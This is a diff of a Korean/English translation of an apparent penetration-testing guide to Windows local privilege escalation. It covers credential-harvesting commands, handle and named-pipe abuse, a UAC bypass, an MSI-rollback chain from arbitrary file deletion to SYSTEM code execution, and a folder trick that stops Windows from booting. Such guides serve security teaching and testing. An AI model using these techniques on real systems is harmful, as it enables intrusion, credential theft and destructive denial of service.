 도구 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) 는 **세션**, **사용자 이름** 및 **비밀번호**를 검색하며, 여러 도구가 이 데이터를 일반 텍스트로 저장합니다 (PuTTY, WinSCP, FileZilla, SuperPuTTY, 및 RDP).
 ```bash
@@ -1231,32 +1240,32 @@ Invoke-SessionGopher -Thorough
 Invoke-SessionGopher -AllDomain -o
 Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 ```
-## 누출된 핸들
+## Leaked Handlers
 
-**SYSTEM으로 실행되는 프로세스가** (`OpenProcess()`) **전체 접근 권한으로 새로운 프로세스를 엽니다**. 같은 프로세스가 **낮은 권한으로 새로운 프로세스를 생성하지만** **주 프로세스의 모든 열린 핸들을 상속받습니다**.\
-그런 다음, **낮은 권한 프로세스에 대한 전체 접근 권한이 있다면**, `OpenProcess()`로 생성된 **특권 프로세스에 대한 열린 핸들을 가져와** **쉘코드를 주입할 수 있습니다**.\
-[이 예제를 읽어보면 **이 취약점을 탐지하고 악용하는 방법에 대한 더 많은 정보를 얻을 수 있습니다**.](leaked-handle-exploitation.md)\
-[이 **다른 게시물을 읽으면 다양한 권한 수준(전체 접근 권한만이 아님)으로 상속된 프로세스와 스레드의 더 많은 열린 핸들을 테스트하고 악용하는 방법에 대한 더 완전한 설명을 얻을 수 있습니다**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).
+Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
+Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
+[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
+[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).
 
-## 명명된 파이프 클라이언트 가장
+## Named Pipe Client Impersonation
 
-공유 메모리 세그먼트, 즉 **파이프**는 프로세스 간의 통신 및 데이터 전송을 가능하게 합니다.
+공유 메모리 세그먼트, 즉 **파이프**는 프로세스 간 통신 및 데이터 전송을 가능하게 합니다.
 
-Windows는 **명명된 파이프**라는 기능을 제공하여 관련 없는 프로세스가 서로 다른 네트워크를 통해서도 데이터를 공유할 수 있게 합니다. 이는 **명명된 파이프 서버**와 **명명된 파이프 클라이언트**로 정의된 역할을 가진 클라이언트/서버 아키텍처와 유사합니다.
+Windows는 **Named Pipes**라는 기능을 제공하여 관련 없는 프로세스가 서로 다른 네트워크를 통해서도 데이터를 공유할 수 있게 합니다. 이는 **named pipe server**와 **named pipe client**로 정의된 역할을 가진 클라이언트/서버 아키텍처와 유사합니다.
 
-**클라이언트**가 파이프를 통해 데이터를 전송할 때, 파이프를 설정한 **서버**는 **필요한 SeImpersonate 권한이 있다면** **클라이언트의 신원을 취할 수 있는 능력**을 가집니다. 파이프를 통해 통신하는 **특권 프로세스**를 식별하고 이를 모방할 수 있는 기회를 제공하여, 해당 프로세스가 당신이 설정한 파이프와 상호작용할 때 그 프로세스의 신원을 채택하여 **더 높은 권한을 얻을 수 있습니다**. 이러한 공격을 실행하는 방법에 대한 지침은 [**여기**](named-pipe-client-impersonation.md)와 [**여기**](#from-high-integrity-to-system)에서 찾을 수 있습니다.
+**클라이언트**가 파이프를 통해 데이터를 전송할 때, 파이프를 설정한 **서버**는 필요한 **SeImpersonate** 권한이 있는 경우 **클라이언트의 신원을 취할 수 있는** 능력을 가집니다. 파이프를 통해 통신하는 **특권 프로세스**를 식별하고 그 신원을 모방할 수 있는 기회를 제공하여, 해당 프로세스가 당신이 설정한 파이프와 상호작용할 때 **더 높은 권한을 얻을 수 있습니다**. 이러한 공격을 실행하는 방법에 대한 지침은 [**여기**](named-pipe-client-impersonation.md)와 [**여기**](#from-high-integrity-to-system)에서 찾을 수 있습니다.
 
-또한 다음 도구는 **burp와 같은 도구로 명명된 파이프 통신을 가로챌 수 있게 해줍니다:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **그리고 이 도구는 모든 파이프를 나열하고 볼 수 있게 해주어 privescs를 찾을 수 있습니다** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
+또한 다음 도구는 **burp와 같은 도구로 named pipe 통신을 가로챌 수 있게 해줍니다:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **그리고 이 도구는 모든 파이프를 나열하고 볼 수 있게 해주어 privescs를 찾는 데 도움을 줍니다** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
 
-## 기타
+## Misc
 
-### Windows에서 실행할 수 있는 파일 확장자
+### File Extensions that could execute stuff in Windows
 
-페이지를 확인하세요 **[https://filesec.io/](https://filesec.io/)**
+Check out the page **[https://filesec.io/](https://filesec.io/)**
 
-### **비밀번호에 대한 명령줄 모니터링**
+### **Monitoring Command Lines for passwords**
 
-사용자로서 쉘을 얻을 때, **명령줄에 자격 증명을 전달하는 예약된 작업이나 다른 프로세스가 실행될 수 있습니다**. 아래 스크립트는 프로세스 명령줄을 2초마다 캡처하고 현재 상태를 이전 상태와 비교하여 차이점을 출력합니다.
+When getting a shell as a user, there may be scheduled tasks or other processes being executed which **pass credentials on the command line**. The script below captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
 ```bash
 while($true)
 {
@@ -1274,7 +1283,7 @@ Compare-Object -ReferenceObject $process -DifferenceObject $process2
 
 이로 인해 권한 상승과 UAC 우회를 동시에 동일한 취약점을 통해 수행할 수 있습니다. 또한, 아무것도 설치할 필요가 없으며, 프로세스 중에 사용되는 바이너리는 Microsoft에 의해 서명되고 발급됩니다.
 
-영향을 받는 시스템은 다음과 같습니다:
+영향을 받는 시스템 중 일부는 다음과 같습니다:
 ```
 SERVER
 ======
@@ -1314,7 +1323,7 @@ Windows 10 1709	16299	link NOT opened
 
 8) Remember to cancel setup and the UAC prompt to return to your desktop.
 ```
-다음 GitHub 리포지토리에서 필요한 모든 파일과 정보를 확인하세요:
+You have all the necessary files and information in the following GitHub repository:
 
 https://github.com/jas502n/CVE-2019-1388
 
@@ -1322,32 +1331,196 @@ https://github.com/jas502n/CVE-2019-1388
 
 **무결성 수준에 대해 배우려면** 이 내용을 읽으세요:
 
+
 {{#ref}}
 integrity-levels.md
 {{#endref}}
 
 그런 다음 **UAC 및 UAC 우회에 대해 배우려면 이 내용을 읽으세요:**
 
+
 {{#ref}}
 ../authentication-credentials-uac-and-efs/uac-user-account-control.md
 {{#endref}}
 
-## **높은 무결성에서 시스템으로**
+## 임의 폴더 삭제/이동/이름 바꾸기에서 SYSTEM EoP로
+
+[**이 블로그 게시물**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)에서 설명된 기술로, [**여기에서 사용할 수 있는**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) 익스플로잇 코드가 있습니다.
+
+이 공격은 기본적으로 Windows Installer의 롤백 기능을 악용하여 제거 과정 중에 합법적인 파일을 악성 파일로 교체하는 것입니다. 이를 위해 공격자는 `C:\Config.Msi` 폴더를 탈취하는 데 사용될 **악성 MSI 설치 프로그램**을 생성해야 하며, 이 폴더는 나중에 Windows Installer가 다른 MSI 패키지를 제거하는 동안 롤백 파일을 저장하는 데 사용됩니다. 롤백 파일은 악성 페이로드를 포함하도록 수정됩니다.
+
+요약된 기술은 다음과 같습니다:
+
+1. **1단계 – 탈취 준비 (C:\Config.Msi 비워두기)**
+
+- 1단계: MSI 설치
+- 무해한 파일(예: `dummy.txt`)을 쓰기 가능한 폴더(`TARGETDIR`)에 설치하는 `.msi`를 만듭니다.
+- 설치 프로그램을 **"UAC 준수"**로 표시하여 **비관리자 사용자**가 실행할 수 있도록 합니다.
+- 설치 후 파일에 대한 **핸들**을 열어 둡니다.
+
+- 2단계: 제거 시작
+- 동일한 `.msi`를 제거합니다.
+- 제거 과정이 `C:\Config.Msi`로 파일을 이동하고 `.rbf` 파일(롤백 백업)로 이름을 바꾸기 시작합니다.
+- **열려 있는 파일 핸들을 폴링**하여 파일이 `C:\Config.Msi\<random>.rbf`가 될 때를 감지합니다.
+
+- 3단계: 사용자 정의 동기화
+- `.msi`에는 **사용자 정의 제거 작업(`SyncOnRbfWritten`)**이 포함되어 있습니다:
+- `.rbf`가 작성되었을 때 신호를 보냅니다.
+- 그런 다음 **계속하기 전에** 다른 이벤트를 기다립니다.
+
+- 4단계: `.rbf` 삭제 차단
+- 신호가 오면, `FILE_SHARE_DELETE` 없이 **`.rbf` 파일을 엽니다** — 이는 **삭제를 방지합니다**.
+- 그런 다음 **신호를 다시 보내** 제거가 완료될 수 있도록 합니다.
+- Windows Installer는 `.rbf`를 삭제하지 못하며, 모든 내용을 삭제할 수 없기 때문에 **`C:\Config.Msi`는 제거되지 않습니다**.
+
+- 5단계: `.rbf` 수동 삭제
+- 당신(공격자)은 `.rbf` 파일을 수동으로 삭제합니다.
+- 이제 **`C:\Config.Msi`는 비어 있으며**, 탈취할 준비가 되었습니다.
+
+> 이 시점에서 **SYSTEM 수준의 임의 폴더 삭제 취약점을 유발하여 `C:\Config.Msi`를 삭제합니다**.
+
+2. **2단계 – 롤백 스크립트를 악성 스크립트로 교체하기**
+
+- 6단계: 약한 ACL로 `C:\Config.Msi` 재생성
+- `C:\Config.Msi` 폴더를 직접 재생성합니다.
+- **약한 DACL**(예: Everyone:F)을 설정하고, `WRITE_DAC`으로 핸들을 열어 둡니다.
+
+- 7단계: 다른 설치 실행
+- `.msi`를 다시 설치합니다:
+- `TARGETDIR`: 쓰기 가능한 위치.
+- `ERROROUT`: 강제 실패를 유발하는 변수.
+- 이 설치는 **롤백**을 다시 유발하는 데 사용되며, `.rbs` 및 `.rbf`를 읽습니다.
+
+- 8단계: `.rbs` 모니터링
+- `ReadDirectoryChangesW`를 사용하여 `C:\Config.Msi`를 모니터링하여 새로운 `.rbs`가 나타날 때까지 기다립니다.
+- 파일 이름을 캡처합니다.
+
+- 9단계: 롤백 전 동기화
+- `.msi`에는 **사용자 정의 설치 작업(`SyncBeforeRollback`)**이 포함되어 있습니다:
+- `.rbs`가 생성될 때 이벤트를 신호로 보냅니다.
+- 그런 다음 **계속하기 전에** 기다립니다.
+
+- 10단계: 약한 ACL 다시 적용
+- `.rbs 생성` 이벤트를 수신한 후:
+- Windows Installer는 `C:\Config.Msi`에 **강한 ACL을 다시 적용합니다**.
+- 그러나 여전히 `WRITE_DAC` 핸들이 있으므로 **약한 ACL을 다시 적용할 수 있습니다**.
+
+> ACL은 **핸들이 열릴 때만 적용되므로**, 여전히 폴더에 쓸 수 있습니다.
+
+- 11단계: 가짜 `.rbs` 및 `.rbf` 드롭
+- `.rbs` 파일을 **가짜 롤백 스크립트**로 덮어씌워 Windows에:
+- 당신의 `.rbf` 파일(악성 DLL)을 **특권 위치**(예: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`)로 복원하도록 지시합니다.
+- **악성 SYSTEM 수준 페이로드 DLL**이 포함된 가짜 `.rbf`를 드롭합니다.
+
+- 12단계: 롤백 유발
+- 동기화 이벤트를 신호로 보내 설치가 재개되도록 합니다.
+- **유형 19 사용자 정의 작업(`ErrorOut`)**이 설정되어 **설치를 의도적으로 실패**하게 합니다.
+- 이로 인해 **롤백이 시작됩니다**.
+
+- 13단계: SYSTEM이 당신의 DLL을 설치합니다
+- Windows Installer는:
+- 당신의 악성 `.rbs`를 읽습니다.
+- 당신의 `.rbf` DLL을 대상 위치로 복사합니다.
+- 이제 **SYSTEM이 로드한 경로에 악성 DLL이 있습니다**.
+
+- 최종 단계: SYSTEM 코드 실행
+- 신뢰할 수 있는 **자동 상승 이진 파일**(예: `osk.exe`)을 실행하여 탈취한 DLL을 로드합니다.
+- **붐**: 당신의 코드가 **SYSTEM으로 실행됩니다**.
+
+
+### 임의 파일 삭제/이동/이름 바꾸기에서 SYSTEM EoP로
+
+주요 MSI 롤백 기술(이전 기술)은 **전체 폴더**(예: `C:\Config.Msi`)를 삭제할 수 있다고 가정합니다. 그러나 취약점이 **임의 파일 삭제**만 허용한다면 어떻게 될까요?
+
+**NTFS 내부**를 악용할 수 있습니다: 모든 폴더에는 숨겨진 대체 데이터 스트림이 있습니다:
+```
+C:\SomeFolder::$INDEX_ALLOCATION
+```
+이 스트림은 폴더의 **인덱스 메타데이터**를 저장합니다.
+
+따라서, 폴더의 **`::$INDEX_ALLOCATION` 스트림을 삭제하면** NTFS는 **파일 시스템에서 전체 폴더를 제거합니다.**
+
+이는 다음과 같은 표준 파일 삭제 API를 사용하여 수행할 수 있습니다:
+```c
+DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
+```
+> 비록 당신이 *파일* 삭제 API를 호출하고 있지만, **폴더 자체를 삭제합니다**.
+
+### 폴더 내용 삭제에서 SYSTEM EoP로
+만약 당신의 원시 기능이 임의의 파일/폴더를 삭제할 수 없지만, **공격자가 제어하는 폴더의 *내용* 삭제를 허용한다면** 어떻게 될까요?
+
+1. 단계 1: 미끼 폴더와 파일 설정
+- 생성: `C:\temp\folder1`
+- 그 안에: `C:\temp\folder1\file1.txt`
+
+2. 단계 2: `file1.txt`에 **oplock** 설정
+- oplock은 **특권 프로세스가 `file1.txt`를 삭제하려고 할 때 실행을 일시 중지**합니다.
+```c
+// pseudo-code
+RequestOplock("C:\\temp\\folder1\\file1.txt");
+WaitForDeleteToTriggerOplock();
+```
+3. 단계 3: SYSTEM 프로세스 트리거 (예: `SilentCleanup`)
+- 이 프로세스는 폴더를 스캔하고 (예: `%TEMP%`) 그 내용을 삭제하려고 시도합니다.
+- `file1.txt`에 도달하면 **oplock이 트리거**되고 제어가 귀하의 콜백으로 전달됩니다.
+
+4. 단계 4: oplock 콜백 내부 – 삭제 리디렉션
+
+- 옵션 A: `file1.txt`를 다른 곳으로 이동
+- 이렇게 하면 oplock을 깨지 않고 `folder1`이 비워집니다.
+- `file1.txt`를 직접 삭제하지 마십시오 — 그렇게 하면 oplock이 조기에 해제됩니다.
+
+- 옵션 B: `folder1`을 **junction**으로 변환:
+```bash
+# folder1 is now a junction to \RPC Control (non-filesystem namespace)
+mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
+```
+- 옵션 C: `\RPC Control`에 **symlink** 생성:
+```bash
+# Make file1.txt point to a sensitive folder stream
+CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
+```
+> 이는 폴더 메타데이터를 저장하는 NTFS 내부 스트림을 대상으로 합니다 — 이를 삭제하면 폴더가 삭제됩니다.
+
+5. Step 5: oplock 해제
+- SYSTEM 프로세스가 계속 진행되며 `file1.txt`를 삭제하려고 합니다.
+- 그러나 이제, 정션 + 심볼릭 링크로 인해 실제로 삭제되는 것은:
+```
+C:\Config.Msi::$INDEX_ALLOCATION
+```
+**결과**: `C:\Config.Msi`는 SYSTEM에 의해 삭제되었습니다.
+
+### 임의 폴더 생성에서 영구적인 DoS로
+
+**파일을 쓸 수 없거나 약한 권한을 설정할 수 없더라도** SYSTEM/admin으로 **임의의 폴더를 생성할 수 있는 원시 기능을 이용하세요**.
+
+**중요한 Windows 드라이버**의 이름으로 **폴더**(파일이 아님)를 생성하세요. 예:
+```
+C:\Windows\System32\cng.sys
+```
+- 이 경로는 일반적으로 `cng.sys` 커널 모드 드라이버에 해당합니다.
+- **폴더로 미리 생성하면**, Windows는 부팅 시 실제 드라이버를 로드하지 못합니다.
+- 그 후, Windows는 부팅 중 `cng.sys`를 로드하려고 시도합니다.
+- 폴더를 발견하고, **실제 드라이버를 해결하지 못하며**, **부팅이 중단되거나 정지합니다**.
+- **대체 방법이 없으며**, **외부 개입(예: 부팅 복구 또는 디스크 접근)** 없이는 **복구할 수 없습니다**.
+
+
+## **High Integrity에서 System으로**
 
 ### **새 서비스**
 
-이미 높은 무결성 프로세스에서 실행 중인 경우, **SYSTEM으로 가는 경로**는 **새 서비스를 생성하고 실행하는 것**이 쉬울 수 있습니다:
+이미 High Integrity 프로세스에서 실행 중이라면, **SYSTEM으로의 경로**는 **새 서비스를 생성하고 실행하는 것**이 간단할 수 있습니다:
 ```
 sc create newservicename binPath= "C:\windows\system32\notepad.exe"
 sc start newservicename
 ```
-> [!NOTE]
-> 서비스 바이너리를 생성할 때 유효한 서비스인지 확인하거나 바이너리가 필요한 작업을 수행하는지 확인하세요. 유효한 서비스가 아니면 20초 후에 종료됩니다.
+> [!TIP]
+> 서비스 바이너리를 생성할 때 유효한 서비스인지 확인하거나 바이너리가 필요한 작업을 빠르게 수행하도록 하십시오. 유효한 서비스가 아니면 20초 후에 종료됩니다.
 
 ### AlwaysInstallElevated
 
-높은 무결성 프로세스에서 **AlwaysInstallElevated 레지스트리 항목을 활성화하고** _**.msi**_ 래퍼를 사용하여 **리버스 셸을 설치**할 수 있습니다.\
-[레지스트리 키와 _.msi_ 패키지를 설치하는 방법에 대한 더 많은 정보는 여기에서 확인하세요.](#alwaysinstallelevated)
+높은 무결성 프로세스에서 **AlwaysInstallElevated 레지스트리 항목을 활성화하고** _**.msi**_ 래퍼를 사용하여 리버스 셸을 **설치**할 수 있습니다.\
+[레지스트리 키와 _.msi_ 패키지를 설치하는 방법에 대한 자세한 정보는 여기에서 확인하십시오.](#alwaysinstallelevated)
 
 ### High + SeImpersonate 권한을 System으로
 
@@ -1357,18 +1530,18 @@ sc start newservicename
 
 이러한 토큰 권한이 있는 경우(아마도 이미 높은 무결성 프로세스에서 찾을 수 있을 것입니다), **거의 모든 프로세스**(보호되지 않은 프로세스)를 SeDebug 권한으로 **열고**, 프로세스의 **토큰을 복사**하여 **해당 토큰으로 임의의 프로세스를 생성**할 수 있습니다.\
 이 기술을 사용할 때는 일반적으로 **모든 토큰 권한을 가진 SYSTEM으로 실행 중인 프로세스를 선택**합니다(_예, 모든 토큰 권한이 없는 SYSTEM 프로세스를 찾을 수 있습니다_).\
-**제안된 기술을 실행하는 코드의 예는** [**여기에서 찾을 수 있습니다**](sedebug-+-seimpersonate-copy-token.md)**.**
+**제안된 기술을 실행하는 코드의** [**예제를 여기에서 찾을 수 있습니다**](sedebug-+-seimpersonate-copy-token.md)**.**
 
 ### **Named Pipes**
 
-이 기술은 meterpreter가 `getsystem`에서 상승하는 데 사용됩니다. 이 기술은 **파이프를 생성한 다음 해당 파이프에 쓰기 위해 서비스를 생성/악용하는 것**으로 구성됩니다. 그런 다음, **`SeImpersonate`** 권한을 사용하여 파이프를 생성한 **서버**는 파이프 클라이언트(서비스)의 **토큰을 가장할 수** 있어 SYSTEM 권한을 얻습니다.\
-이름 파이프에 대해 [**더 알아보려면 이 글을 읽어야 합니다**](#named-pipe-client-impersonation).\
-높은 무결성에서 SYSTEM으로 이동하는 방법에 대한 예를 보려면 [**이 글을 읽어야 합니다**](from-high-integrity-to-system-with-name-pipes.md).
+이 기술은 meterpreter가 `getsystem`에서 상승하는 데 사용됩니다. 이 기술은 **파이프를 생성한 다음 해당 파이프에 쓰기 위해 서비스를 생성/악용하는** 것으로 구성됩니다. 그런 다음, **`SeImpersonate`** 권한을 사용하여 파이프를 생성한 **서버**는 파이프 클라이언트(서비스)의 **토큰을 가장할 수** 있어 SYSTEM 권한을 얻습니다.\
+이름 파이프에 대해 [**더 알고 싶다면 이 글을 읽어야 합니다**](#named-pipe-client-impersonation).\
+높은 무결성에서 SYSTEM으로 이동하는 방법에 대한 [**예제를 읽고 싶다면 이 글을 읽어야 합니다**](from-high-integrity-to-system-with-name-pipes.md).
 
 ### Dll Hijacking
 
-**SYSTEM**으로 실행 중인 **프로세스**에 의해 **로드되는 dll을 하이재킹**하는 데 성공하면 해당 권한으로 임의의 코드를 실행할 수 있습니다. 따라서 Dll Hijacking은 이러한 종류의 권한 상승에도 유용하며, 더욱이 높은 무결성 프로세스에서 **더 쉽게 달성할 수 있습니다**. 이는 dll을 로드하는 데 사용되는 폴더에 **쓰기 권한**을 가지기 때문입니다.\
-**Dll 하이재킹에 대해** [**더 알아보려면 여기에서 확인하세요**](dll-hijacking/index.html)**.**
+**SYSTEM**으로 실행 중인 **프로세스**에 의해 **로드되는 dll을 탈취**하는 데 성공하면 해당 권한으로 임의의 코드를 실행할 수 있습니다. 따라서 Dll Hijacking은 이러한 종류의 권한 상승에 유용하며, 더욱이 높은 무결성 프로세스에서 **달성하기가 훨씬 더 쉽습니다**. 이는 dll을 로드하는 데 사용되는 폴더에 **쓰기 권한**을 가지기 때문입니다.\
+**Dll hijacking에 대해** [**더 알고 싶다면 여기에서 확인하십시오**](dll-hijacking/index.html)**.**
 
 ### **Administrator 또는 Network Service에서 System으로**
 
@@ -1378,11 +1551,11 @@ sc start newservicename
 
 ### LOCAL SERVICE 또는 NETWORK SERVICE에서 전체 권한으로
 
-**읽기:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)
+**읽어보십시오:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)
 
 ## 추가 도움
 
-[정적 impacket 바이너리](https://github.com/ropnop/impacket_static_binaries)
+[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)
 
 ## 유용한 도구
 
@@ -1391,31 +1564,31 @@ sc start newservicename
 **PS**
 
 [**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
-[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 잘못된 구성 및 민감한 파일 확인 (**[**여기에서 확인하세요**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). 감지됨.**\
-[**JAWS**](https://github.com/411Hall/JAWS) **-- 일부 가능한 잘못된 구성을 확인하고 정보 수집 (**[**여기에서 확인하세요**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
+[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 잘못된 구성 및 민감한 파일 확인 (**[**여기에서 확인하십시오**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). 감지됨.**\
+[**JAWS**](https://github.com/411Hall/JAWS) **-- 일부 가능한 잘못된 구성을 확인하고 정보 수집 (**[**여기에서 확인하십시오**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
 [**privesc** ](https://github.com/enjoiz/Privesc)**-- 잘못된 구성 확인**\
 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla 및 RDP 저장 세션 정보를 추출합니다. 로컬에서 -Thorough 사용.**\
 [**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- 자격 증명을 Credential Manager에서 추출합니다. 감지됨.**\
 [**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 수집된 비밀번호를 도메인에 분산시킵니다**\
 [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh는 PowerShell ADIDNS/LLMNR/mDNS/NBNS 스푸퍼 및 중간자 도구입니다.**\
 [**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 기본 privesc Windows 열거**\
-[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- 알려진 privesc 취약점을 검색합니다 (DEPRECATED for Watson)\
+[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- 알려진 privesc 취약점 검색 (DEPRECATED for Watson)\
 [~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- 로컬 검사 **(관리자 권한 필요)**
 
 **Exe**
 
-[**Watson**](https://github.com/rasta-mouse/Watson) -- 알려진 privesc 취약점을 검색합니다 (VisualStudio를 사용하여 컴파일해야 함) ([**미리 컴파일된**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
-[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 잘못된 구성을 검색하기 위해 호스트를 열거합니다 (privesc보다 정보 수집 도구에 가깝습니다) (컴파일 필요) **(**[**미리 컴파일된**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
-[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 많은 소프트웨어에서 자격 증명을 추출합니다 (github에 미리 컴파일된 exe)**\
+[**Watson**](https://github.com/rasta-mouse/Watson) -- 알려진 privesc 취약점 검색 (VisualStudio를 사용하여 컴파일해야 함) ([**사전 컴파일**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
+[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 잘못된 구성을 검색하기 위해 호스트를 열거합니다 (privesc보다 정보 수집 도구에 가깝습니다) (컴파일 필요) **(**[**사전 컴파일**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
+[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 많은 소프트웨어에서 자격 증명을 추출합니다 (github에 사전 컴파일된 exe)**\
 [**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp의 C# 포트**\
-[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- 잘못된 구성 확인 (github에 미리 컴파일된 실행 파일). 권장하지 않음. Win10에서 잘 작동하지 않음.\
+[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- 잘못된 구성 확인 (github에 사전 컴파일된 실행 파일). 권장하지 않음. Win10에서 잘 작동하지 않음.\
 [~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 가능한 잘못된 구성 확인 (python에서 exe). 권장하지 않음. Win10에서 잘 작동하지 않음.
 
 **Bat**
 
 [**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- 이 게시물을 기반으로 생성된 도구 (정상적으로 작동하기 위해 accesschk가 필요하지 않지만 사용할 수 있습니다).
 
-**Local**
+**로컬**
 
 [**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo**의 출력을 읽고 작동하는 익스플로잇을 추천합니다 (로컬 python)\
 [**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo**의 출력을 읽고 작동하는 익스플로잇을 추천합니다 (로컬 python)
